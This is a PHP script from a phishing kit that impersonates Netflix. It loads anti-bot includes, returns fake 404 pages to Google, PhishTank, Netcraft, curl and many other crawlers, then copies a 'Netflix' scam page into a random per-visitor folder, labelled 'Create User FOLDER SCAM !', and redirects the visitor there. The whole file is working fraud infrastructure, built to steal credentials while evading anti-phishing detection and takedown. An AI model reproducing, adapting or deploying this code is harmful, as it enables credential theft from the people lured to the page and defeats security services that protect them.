<?php
session_start();
error_reporting(0);
//------------------------------------------||  ANTIBOTS  ||-----------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include "./BOTS/antibots7.php";
//---------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//---------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./Netflix".$DIR;
$DST10_="Netflix";
function recurse_copy($DST10_,$DIR) {
$dir = opendir($DST10_);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($DST10_ . '/' . $file) ) {
recurse_copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
else {
copy($DST10_ . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $DST10_, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");
?>

